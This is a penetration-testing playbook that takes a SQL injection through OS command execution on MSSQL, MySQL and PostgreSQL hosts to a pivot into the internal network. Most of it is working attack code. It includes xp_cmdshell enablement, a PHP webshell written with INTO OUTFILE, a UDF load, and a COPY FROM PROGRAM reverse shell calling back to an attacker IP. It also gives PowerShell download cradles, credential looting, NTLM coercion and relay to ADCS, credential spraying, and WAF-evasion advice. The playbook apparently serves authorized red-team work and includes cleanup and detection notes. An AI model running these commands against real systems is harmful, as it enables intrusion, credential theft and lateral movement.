---
tags:
  - hack-notes
  - playbook
  - web
  - database
---

# SQL Injection to RCE to Pivot Playbook

> From a single SQL injection in a web app, escalate data access to OS code execution on the database host, then pivot into the internal network using harvested creds.

> **Attack graph position**
> **Fed by:** Entry point (a reachable web app).
> **Feeds into:** [IPv6 mitm6 Relay to RBCD Takeover](IPv6%20mitm6%20Relay%20to%20RBCD%20Takeover.md) (internal pivot from the DB host); [AWS IMDS SSRF to Account Takeover](AWS%20IMDS%20SSRF%20to%20Account%20Takeover.md) (managed DB, cloud creds).
> Full chain map: [Attack Graph](Attack%20Graph.md)

## Scenario at a Glance

| | |
|---|---|
| Goal | Turn a confirmed SQLi into shell on the DB host and a foothold deeper in the network |
| Starting position | Unauthenticated or low-priv access to a web app with one injectable parameter |
| End state | Command execution on the DB server, then lateral movement using recovered creds / relayed auth |
| Key techniques | T1190 Exploit Public-Facing App, T1505.003 Web Shell, T1059 Command Execution, T1557.001 LLMNR/NBT-NS Poisoning and SMB Relay, T1003 Credential Dumping, T1021 Remote Services |
| Prerequisites | A reachable, injectable parameter; DB user with enough privilege for at least one OS-exec primitive, OR a relay/cred path when not |
| Difficulty | Medium (sysadmin/FILE-priv) to High (low-priv user, managed DB) |
| Noise level | Loud if you enable xp_cmdshell or drop webshells; Moderate for read-only data theft; Quiet for OOB UNC capture |

## Attack Path

```
[1] Confirm SQLi + fingerprint DBMS + identify current user privilege
        |
        v
[2] Branch on engine + privilege
        |
   +----+--------------------------+-------------------------------+
   |                               |                               |
 MSSQL                          MySQL/MariaDB                   PostgreSQL
   |                               |                               |
 sysadmin? --> xp_cmdshell      FILE priv +                    superuser/
   sp_OACreate                   secure_file_priv='' -->        pg_execute_server_program?
   |                              INTO OUTFILE webshell           --> COPY FROM PROGRAM
 NOT sysadmin? --> linked-server   OR lib_mysqludf_sys UDF       NOT? --> plpython/plperl,
   EXECUTE AS / openquery to a                                     large-object file write,
   server where you ARE sa,                                        or pivot to creds only
   OR xp_dirtree UNC capture -->
   Responder / ntlmrelayx -->
   relay SQL svc hash to ADCS / SMB
        |
        v
[3] Got OS exec on DB host? --> drop a stable shell (catch with C2 / nc)
        |
        v
[4] Loot: connection strings, app config, cached creds, other DB links
        |
        v
[5] Pivot: SOCKS through the DB host, spray recovered creds with NetExec,
    relay/PtH into the internal network
        |
        v
   Managed DB (RDS / Cloud SQL / Azure SQL)? --> OS exec is BLOCKED.
   Skip [3]. Pivot to data exfil + cloud creds (IMDS via OOB, IAM tokens).
```

## Prerequisites and Setup

- Confirmed SQL injection point (parameter, method, injection type: union / error / boolean / time-based / stacked).
- Scoped authorization that explicitly permits OS-level command execution and lateral movement. RCE and pivoting are out of scope on many web-app tests; confirm before step 3.
- Attacker box reachable from the DB host for any reverse shell or UNC/SMB capture (or a redirector if the DB host only egresses to the internet).
- Tooling:
  - `sqlmap` (current release, the `--os-shell` / `--os-pwn` engine still works against MSSQL/MySQL/PostgreSQL).
  - Impacket (`impacket-mssqlclient`, `impacket-ntlmrelayx`, `impacket-smbserver`).
  - `NetExec` (`nxc`, the maintained successor to CrackMapExec) for the `mssql` and `smb` modules.
  - `Responder` for LLMNR/NBT-NS and SMB capture, or `ntlmrelayx` for active relay.
  - `psql` / `mysql` clients for hand-driven stacked queries when sqlmap is too noisy.
  - A SOCKS proxy tool (`chisel`, `ligolo-ng`, or sqlmap-agnostic) once you have a shell. See [Pivoting and Tunneling](../Cheatsheets/Pivoting%20and%20Tunneling.md).
- Know your egress: if the DB host has no outbound, you are limited to in-band data theft and OOB DNS, not reverse shells.

## Walkthrough

### Step 1. Confirm the injection and fingerprint the DBMS

What and why: you cannot pick an exec primitive until you know the engine and your privilege level. Fingerprint first, escalate second.

Confirm manually with a boolean and an error probe, then let sqlmap fingerprint:

```bash
# Manual sanity check (boolean differential)
curl "https://victim/app?id=1 AND 1=1"     # baseline true
curl "https://victim/app?id=1 AND 1=2"     # should differ -> injectable

# sqlmap: confirm, fingerprint engine + banner, identify current user and DBA status
sqlmap -u "https://victim/app?id=1" --batch \
  --banner --current-user --current-db --is-dba --dbs
```

Engine tells:
- `@@version` / banner string ("Microsoft SQL Server", "MariaDB", "PostgreSQL x.y").
- Error syntax (MSSQL "Unclosed quotation mark", MySQL "You have an error in your SQL syntax", Postgres "unterminated quoted string").
- Comment/concat behavior (MSSQL `+`, MySQL `CONCAT()`/space, Postgres `||`).

Success signal: sqlmap prints `the back-end DBMS is <engine>`, the banner version, the current DB user, and `current user is DBA: True/False`. That last line is the fork.

Decision: `is-dba: True` (MSSQL sysadmin / Postgres superuser / MySQL with FILE) puts you on the direct-RCE branches below. `False` jumps you to the linked-server / UNC-capture / cred-only variations in **Variations and Pivots**.

### Step 2. Check stacked-query support and the OS-exec primitive

What and why: most direct-exec paths need stacked queries (`; EXEC ...`) or a privileged built-in. Verify the primitive is reachable before committing to a noisy enable.

```bash
# Does the injection allow stacked queries? (sqlmap tags STACKED if so)
sqlmap -u "https://victim/app?id=1" --batch --technique=S --string="<known-true-marker>"
```

MSSQL: confirm you can read config.
```sql
-- via the injection / mssqlclient
SELECT IS_SRVROLEMEMBER('sysadmin');   -- 1 = you can flip xp_cmdshell directly
```
MySQL: confirm FILE priv and the export sandbox.
```sql
SELECT CURRENT_USER();
SELECT * FROM information_schema.user_privileges WHERE privilege_type='FILE';
SHOW VARIABLES LIKE 'secure_file_priv';   -- '' = anywhere, NULL = export disabled, /path = that dir only
SHOW VARIABLES LIKE 'plugin_dir';          -- needed for the UDF path
```
PostgreSQL: confirm role power.
```sql
SELECT current_user, usesuper FROM pg_user WHERE usename = current_user;
SELECT rolname FROM pg_roles WHERE pg_has_role(current_user, oid, 'member')
  AND rolname IN ('pg_execute_server_program','pg_read_server_files','pg_write_server_files');
```

Success signal: MSSQL returns `1`; MySQL returns a FILE grant and a non-NULL, writable `secure_file_priv`; Postgres returns `usesuper = t` or membership in `pg_execute_server_program`.

Decision: each negative here drops you to the corresponding fallback (linked server, UDF vs OUTFILE, plpython vs large-object) covered below.

### Step 3a. MSSQL: enable and run xp_cmdshell

What and why: the canonical MSSQL-to-OS bridge. Disabled by default, requires sysadmin to enable, then PUBLIC can be granted exec. Loud (it writes config-change events), so prefer it when you already hold sysadmin and OPSEC tolerance is set.

Hand-driven over a stacked injection:
```sql
; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
  EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
; EXEC xp_cmdshell 'whoami'; --
```

Cleaner with Impacket once you have SQL creds or have pivoted onto 1433:
```bash
impacket-mssqlclient corp.local/svc_sql:'Passw0rd!'@10.10.10.5 -windows-auth
# in the shell:
SQL> enable_xp_cmdshell
SQL> xp_cmdshell whoami
SQL> xp_cmdshell powershell -enc <base64-stager>
```

Or fully automated with sqlmap straight from the web injection:
```bash
sqlmap -u "https://victim/app?id=1" --batch --os-shell
# sqlmap auto-enables xp_cmdshell when current user is sysadmin
sqlmap -u "https://victim/app?id=1" --batch --os-cmd "whoami /priv"
```

With NetExec when you already reach 1433 on the host:
```bash
nxc mssql 10.10.10.5 -u svc_sql -p 'Passw0rd!' --local-auth -x "whoami"
nxc mssql 10.10.10.5 -u svc_sql -p 'Passw0rd!' -q "SELECT IS_SRVROLEMEMBER('sysadmin')"
```

Success signal: `xp_cmdshell 'whoami'` returns the service account (often `nt service\mssqlserver` or a domain `svc_*`). That identity is what you pivot as.

Decision: if `xp_cmdshell` is policy-blocked but you are still sysadmin, use the OLE automation fallback (3b). If you are NOT sysadmin, go to the linked-server / UNC-capture variations.

### Step 3b. MSSQL: sp_OACreate (OLE automation) fallback

What and why: when xp_cmdshell is hard-disabled but `Ole Automation Procedures` is enabled (or you can enable it as sysadmin), `sp_OACreate` instantiates `WScript.Shell` to run commands. Different telemetry footprint than xp_cmdshell.

```sql
; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
  EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE; --
; DECLARE @o INT, @out INT;
  EXEC sp_OACreate 'WScript.Shell', @o OUT;
  EXEC sp_OAMethod @o, 'Run', @out OUT,
    'cmd /c powershell -enc <base64-stager>'; --
```

Success signal: the stager calls back (sp_OAMethod is fire-and-forget, so verify on the listener, not in the query response).

### Step 3c. MySQL/MariaDB: INTO OUTFILE webshell

What and why: with FILE priv and a permissive `secure_file_priv` (empty string), you can write a PHP/JSP webshell into the webroot and get OS exec through the web server instead of the DB process. Cleanest when the DB and web tiers share a host.

```sql
-- needs a known, writable, web-served path; UNION the shell out
?id=1 UNION SELECT "<?php system($_GET['c']); ?>",2,3
  INTO OUTFILE '/var/www/html/.x.php'-- -
```
sqlmap can do this directly when it can locate the webroot:
```bash
sqlmap -u "https://victim/app?id=1" --batch --os-shell
# pick the language; sqlmap stages a stager+uploader via INTO OUTFILE,
# then gives you an OS shell through the served file
```
Then drive it:
```bash
curl "https://victim/.x.php?c=id"
```

Success signal: the served file executes (`id` / `whoami` returns the web user). Note this gives you the **web** user context, not the DB process user.

Decision: no writable web path or `secure_file_priv` restricts you to a non-web dir? Drop to the UDF path (3d). NULL `secure_file_priv`? OUTFILE is dead; go to creds-only.

### Step 3d. MySQL/MariaDB: lib_mysqludf_sys UDF

What and why: writes a shared object into `@@plugin_dir`, registers `sys_exec()`/`sys_eval()`, and runs commands as the **mysqld** user (root if MySQL runs as root). Use when OUTFILE-to-webroot is unavailable but FILE priv + writable plugin_dir + non-NULL `secure_file_priv` exist.

```sql
-- write the precompiled .so into plugin_dir (hex-encoded blob of lib_mysqludf_sys)
SELECT 0x<hex-of-lib_mysqludf_sys.so> INTO DUMPFILE '/usr/lib/mysql/plugin/sys.so';
CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'sys.so';
CREATE FUNCTION sys_eval RETURNS STRING SONAME 'sys.so';
SELECT sys_eval('id');
```
sqlmap automates the same with the right OS/arch detection:
```bash
sqlmap -u "https://victim/app?id=1" --batch --os-shell
```

Success signal: `sys_eval('id')` returns the mysqld user. Note the function objects and the `.so` are durable artifacts to remove in cleanup.

### Step 3e. PostgreSQL: COPY ... FROM PROGRAM

What and why: superusers and members of `pg_execute_server_program` can shell out via `COPY`. This is the CVE-2019-9193 lineage. The Postgres project disputes it as a vulnerability (it is intended, gated functionality), but it remains a live RCE primitive whenever you control a sufficiently privileged role, which is the common case after SQLi against an app DB that connects as a superuser. Still the go-to Postgres exec path in 2024-2026.

```sql
-- read command output back into a table (in-band)
DROP TABLE IF EXISTS x;
CREATE TABLE x(o text);
COPY x FROM PROGRAM 'id';
SELECT * FROM x;
```
Reverse shell variant:
```sql
COPY x FROM PROGRAM
  'bash -c "bash -i >& /dev/tcp/10.10.14.7/443 0>&1"';
```
sqlmap path:
```bash
sqlmap -u "https://victim/app?id=1" --batch --dbms=postgresql --os-shell
```

Success signal: the table fills with command output, or your listener catches the shell. Runs as the `postgres` OS user.

Decision: not a superuser and not in `pg_execute_server_program`? Try `plpythonu`/`plperlu` if the untrusted language is installed, or the large-object file-write below.

### Step 3f. PostgreSQL: plpython/plperl and large-object file write

What and why: alternate Postgres exec/write when COPY is blocked.

Untrusted procedural language (needs `CREATE LANGUAGE` rights, usually superuser):
```sql
CREATE OR REPLACE FUNCTION shell(cmd text) RETURNS text AS $$
  import subprocess
  return subprocess.check_output(cmd, shell=True).decode()
$$ LANGUAGE plpythonu;
SELECT shell('id');
```
Large-object arbitrary file write (lower bar than COPY for getting a file on disk, e.g. a cron job or webshell):
```sql
SELECT lo_create(31337);
INSERT INTO pg_largeobject (loid, pageno, data)
  VALUES (31337, 0, decode('<hex-of-file-contents>','hex'));
SELECT lo_export(31337, '/var/www/html/.x.php');
```

Success signal: the language function returns output, or the exported file is served / executed.

### Step 4. Stand up a stable shell

What and why: webshell and `xp_cmdshell` one-liners are fragile and noisy per-command. Migrate to a single persistent channel as soon as exec is proven. See [Reverse Shells and File Transfer](../Cheatsheets/Reverse%20Shells%20and%20File%20Transfer.md).

```bash
# attacker: catch
nc -lvnp 443      # or your C2 listener / a redirector if DB host only egresses to internet

# from the exec primitive, fire one stager (PowerShell on Windows, bash on Linux)
# Windows (via xp_cmdshell / sp_OACreate):
powershell -nop -w hidden -enc <base64 of IEX download-cradle>
# Linux (via COPY FROM PROGRAM / UDF):
bash -c 'bash -i >& /dev/tcp/10.10.14.7/443 0>&1'
```

Success signal: interactive session on the DB host, running as the DB service account (Windows) or `postgres`/`mysql`/`root` (Linux).

Decision: if the DB host has no outbound, stay in-band. Skip the reverse shell, keep using the query channel for file read/loot, and pivot via OOB DNS or by relaying captured auth (step 6) instead.

### Step 5. Loot connection strings and credentials

What and why: the DB host is a credential goldmine. App config files hold DB connection strings, service accounts, API keys, and other linked-DB creds, which are your pivot fuel.

```bash
# Windows DB host
type C:\inetpub\wwwroot\web.config | findstr /i "connectionString password"
reg query "HKLM\SOFTWARE\Microsoft\Microsoft SQL Server" /s
# dump LSASS / SAM only if scoped (loud); prefer config + DPAPI app creds first

# Linux DB host
cat /var/www/html/**/.env /var/www/html/**/config*.php 2>/dev/null \
  | grep -iE "pass|user|host|secret|token|key"
cat ~/.pgpass ~mysql/.my.cnf 2>/dev/null
```
In-DB loot (no shell needed):
```sql
-- MSSQL: enumerate linked servers and saved logins
SELECT srvname, isremote FROM sysservers;
EXEC sp_helplinkedsrvlogin;
-- MySQL: stored creds / other apps
SELECT user, authentication_string FROM mysql.user;
```

Success signal: plaintext or crackable DB/service creds, plus a map of linked servers and other internal DB hosts.

### Step 6. UNC capture and relay (the credential-less MSSQL pivot)

What and why: even a low-priv MSSQL login (PUBLIC role) can call `xp_dirtree` against a UNC path, coercing the SQL **service account** to authenticate to you. Capture the NetNTLMv2 for cracking, or relay it live. As of 2024 `sys.dm_os_enumerate_filesystem` and `sys.dm_os_file_exists` are alternates when `xp_dirtree` is disabled. This is the quiet, no-RCE-needed pivot.

Capture for cracking:
```bash
# attacker
sudo responder -I eth0
# trigger from the injection / mssqlclient (PUBLIC can run this)
SQL> exec master..xp_dirtree '\\10.10.14.7\share', 1, 1
# alternates if xp_dirtree is blocked:
SQL> SELECT * FROM sys.dm_os_enumerate_filesystem('\\10.10.14.7\share','*')
```
Crack the captured `MSSQLSvc$`/`svc_sql` NetNTLMv2 offline:
```bash
hashcat -m 5600 sqlsvc.hash rockyou.txt
```
Relay live (when SMB signing is off on a target, or relay to ADCS web enrollment for a cert):
```bash
# relay the coerced SQL service auth to a target SMB host, or to ADCS HTTP enrollment
impacket-ntlmrelayx -t smb://10.10.10.20 -smb2support -socks
# ADCS ESC8 style: relay to the CA web endpoint to mint a cert for the service account
impacket-ntlmrelayx -t http://10.10.10.30/certsrv/certfnsh.asp \
  -smb2support --adcs --template DomainController
# then trigger the coercion from MSSQL as above
```

Note: Microsoft has been hardening this path. Extended Protection for Authentication (EPA) is now default on newer ADCS / Exchange installs, and SMB signing default-on rollouts blunt SMB relay. Enumerate EPA/signing before committing (NetExec `--gen-relay-list` / signing checks).

Success signal: Responder logs a `[SMB] NTLMv2-SSP Hash` for the SQL service account, or ntlmrelayx reports a successful relay (dumped SAM, a SOCKS session, or an issued certificate).

Decision: SQL service runs as a domain account with rights elsewhere? Relay or crack it and move laterally. Runs as a low-priv local/virtual account? Crack for offline value but pivot via other looted creds instead.

### Step 7. Pivot into the internal network

What and why: convert the DB host foothold and looted creds into reach across the internal subnet. Tunnel, then spray. See [Pivoting and Tunneling](../Cheatsheets/Pivoting%20and%20Tunneling.md) and [NetExec and Impacket](../Cheatsheets/NetExec%20and%20Impacket.md).

```bash
# 1) SOCKS proxy through the DB host (chisel example)
#    attacker:
./chisel server -p 8080 --reverse
#    DB host:
./chisel client 10.10.14.7:8080 R:1080:socks

# 2) spray looted creds across the subnet through the tunnel
proxychains nxc smb 10.10.10.0/24 -u svc_sql -p 'Passw0rd!' --shares
proxychains nxc smb 10.10.10.0/24 -u svc_sql -H <nt-hash> --continue-on-success

# 3) hop to the next box where the creds land
proxychains nxc smb 10.10.10.21 -u svc_sql -p 'Passw0rd!' -x "whoami"
```

Success signal: NetExec marks `(Pwn3d!)` on a host where the creds grant admin, or you authenticate to an internal share/service you could not reach before.

Decision: from here continue into the AD-side chains. If the SQL service account is a domain account with delegation or local-admin reuse, follow [Internal Network and Active Directory](../Checklists/Internal%20Network%20and%20Active%20Directory.md).

## OPSEC and Detection

- xp_cmdshell enablement is high-signal. `sp_configure` changes raise SQL Server error-log entries and, where configured, **Event ID 15457** (config option changed). A monitored estate alerts on `xp_cmdshell` flipping to 1. Prefer it only when you already hold sysadmin and noise is accepted; otherwise use the UNC-capture path which touches no config.
- Process lineage: `sqlservr.exe` or `postgres`/`mysqld` spawning `cmd.exe`, `powershell.exe`, `bash`, or `sh` is a top EDR detection. Any child process of the DB engine is anomalous.
- New files in the webroot (the OUTFILE/large-object webshell) trip FIM/file-integrity monitoring and webserver access-log anomalies (a never-before-seen `.php` getting hit).
- Outbound from the DB host is rarely normal. A reverse shell or download cradle egressing from a DB server stands out in netflow and proxy logs. Egress to an attacker IP on 443/445 is the tell.
- SMB auth from the DB host to an unknown host (the xp_dirtree coercion) shows as **Event ID 4624/4648** on the destination and an outbound 445 in netflow. Responder/relay also leaves the broadcast poisoning footprint on the wire.
- WAF and DB query logging: union/stacked payloads, `xp_cmdshell`, `COPY ... FROM PROGRAM`, and `INTO OUTFILE` are signatured strings. sqlmap's default tamper-free traffic is trivially caught; expect WAF blocks. See BypassBurrito and [Web App and Payloads](../Cheatsheets/Web%20App%20and%20Payloads.md) for evasion.
- Noise-reduction: pace requests, prefer in-band data theft over enabling features, use the OOB/UNC path when you only need a hash, and tear down any enabled feature immediately (cleanup below).

## Cleanup

- MSSQL: disable any feature you enabled, in reverse order.
  ```sql
  EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
  EXEC sp_configure 'Ole Automation Procedures', 0; RECONFIGURE;
  EXEC sp_configure 'show advanced options', 0; RECONFIGURE;
  ```
  (Impacket: `SQL> disable_xp_cmdshell`.) Only re-disable options that were off when you arrived. Note the config-change in your log so the client can verify the revert.
- MySQL: drop the UDF functions and remove the shared object.
  ```sql
  DROP FUNCTION IF EXISTS sys_exec;
  DROP FUNCTION IF EXISTS sys_eval;
  ```
  Delete `/usr/lib/mysql/plugin/sys.so` (or wherever it was dumped) from the OS shell.
- PostgreSQL: drop created functions, tables, and large objects.
  ```sql
  DROP FUNCTION IF EXISTS shell(text);
  DROP TABLE IF EXISTS x;
  SELECT lo_unlink(31337);
  ```
- Webshells / written files: remove every OUTFILE / DUMPFILE / lo_export artifact (`.x.php`, staged uploaders, sqlmap's `tmpu*.php`/`tmpb*` helpers) from the webroot and temp dirs.
- Shells / persistence: kill any reverse shell, remove dropped binaries (chisel client, stagers), and revert any cron/scheduled task created for stability.
- Relay artifacts: tear down Responder/ntlmrelayx and remove any SOCKS sessions; if ADCS issued a cert, record it for the report so it can be revoked.
- Record every credential recovered for the report; do not leave cracked creds in active use.

## Troubleshooting

- "secure_file_priv option so it cannot execute": MySQL export is sandboxed. If it shows a path, write only inside it (often useless for webshells). If NULL, OUTFILE/DUMPFILE are dead, pivot to UDF (if plugin_dir writable) or creds-only.
- xp_cmdshell "SQL Server blocked access ... because this component is turned off": you need sysadmin to flip it. If `IS_SRVROLEMEMBER('sysadmin')` is 0, do not waste payloads, go to linked-server EXECUTE AS or the xp_dirtree capture path.
- COPY FROM PROGRAM "must be superuser or a member of pg_execute_server_program": you lack the role. Try plpython/plperl (needs CREATE LANGUAGE), large-object file write, or pivot to creds only.
- No output from xp_cmdshell but it "ran": sp_OAMethod and some fire-and-forget paths return nothing in-band. Verify on your listener, not the query response. Use a marker command (write a file, ping yourself) to confirm exec blind.
- WAF blocks the payload: signature on `xp_cmdshell`/`OUTFILE`/`COPY`. Inline-comment, case-vary, chunk, or hex/char-encode the keyword; route through BypassBurrito. Out-of-band exfil (DNS) when in-band responses are filtered.
- Stacked queries not supported: the injection only allows union/boolean. xp_cmdshell-via-stacked is out; you may still read config and call `xp_dirtree` if the context allows a subquery, otherwise it is data theft + OOB only.
- DB host has no outbound: reverse shells fail. Stay in-band (read files via the query channel), use OOB DNS for blind confirmation, and pivot by relaying coerced auth rather than catching a shell.
- Relay fails ("SMB signing required" / EPA): the target enforces signing or Extended Protection (default-on in newer builds). Pick an unsigned target, fall back to cracking the captured NetNTLMv2 offline, or relay to a service that does not enforce EPA.
- Managed DB (RDS / Cloud SQL / Azure SQL): OS access is removed by the provider. `xp_cmdshell`, `COPY FROM PROGRAM`, and UDF loading are blocked or unavailable. Do not burn time on RCE. Pivot to data exfil and cloud creds instead (next section).

## Variations and Pivots

- MSSQL low-priv (not sysadmin), linked-server EXECUTE AS / openquery: enumerate links (`SELECT srvname FROM sysservers` / `EXEC sp_helplinkedsrvlogin`). If a link maps your login to a sysadmin on the remote instance, run xp_cmdshell over it: `EXEC ('EXEC sp_configure ''xp_cmdshell'',1; RECONFIGURE; EXEC xp_cmdshell ''whoami''') AT [LINKEDSRV]`, or `SELECT * FROM OPENQUERY([LINKEDSRV],'...')`. Chain `EXECUTE AS LOGIN` across trustworthy databases to climb from db_owner to sysadmin where TRUSTWORTHY is set. Impacket's `enum_links` / `use_link` automate the hop.
- MSSQL Machine Learning Services (sp_execute_external_script): where `xp_cmdshell` is locked but MLS (R/Python) is enabled, run OS commands through the external script runtime instead. NetExec has a module for this exec method as a 2024-era alternative to xp_cmdshell.
- Managed DB, pivot to cloud: with no OS access, the value is data and cloud identity. Exfil sensitive tables in-band; use the DB's outbound (where allowed) or an SSRF-adjacent primitive to hit the instance metadata service for IAM creds, then move into the cloud account. Continue in [AWS Cloud Penetration Test](../Checklists/AWS%20Cloud%20Penetration%20Test.md) or [Azure and M365 Entra ID](../Checklists/Azure%20and%20M365%20Entra%20ID.md).
- Stacked-query privesc inside the app: if OS exec is out of scope/blocked, escalate within the app via stacked `INSERT`/`UPDATE` (add an admin user, flip an `is_admin` flag, reset a password hash) for a second-order foothold in the application itself.
- From OS shell on the DB host, go vertical: harvested service account into AD via [Internal Network and Active Directory](../Checklists/Internal%20Network%20and%20Active%20Directory.md) and [NetExec and Impacket](../Cheatsheets/NetExec%20and%20Impacket.md); Linux DB host local privesc via [Linux Privilege Escalation](../Cheatsheets/Linux%20Privilege%20Escalation.md); Windows DB host via [Windows Privilege Escalation](../Cheatsheets/Windows%20Privilege%20Escalation.md).
- Secondary-context exploitation: where the injected query feeds a second backend (report engine, ETL job, BI tool) running as a higher-priv principal, target that downstream context rather than the front-end DB user.

## Related

- [Web Application](../Checklists/Web%20Application.md)
- [Database Security](../Checklists/Database%20Security.md)
- [Web App and Payloads](../Cheatsheets/Web%20App%20and%20Payloads.md)
- [NetExec and Impacket](../Cheatsheets/NetExec%20and%20Impacket.md)
- [Pivoting and Tunneling](../Cheatsheets/Pivoting%20and%20Tunneling.md)
- [Reverse Shells and File Transfer](../Cheatsheets/Reverse%20Shells%20and%20File%20Transfer.md)
- BypassBurrito
- [Internal Network and Active Directory](../Checklists/Internal%20Network%20and%20Active%20Directory.md)
- [Windows Privilege Escalation](../Cheatsheets/Windows%20Privilege%20Escalation.md)
- [Linux Privilege Escalation](../Cheatsheets/Linux%20Privilege%20Escalation.md)
- [AWS Cloud Penetration Test](../Checklists/AWS%20Cloud%20Penetration%20Test.md)
- [Azure and M365 Entra ID](../Checklists/Azure%20and%20M365%20Entra%20ID.md)
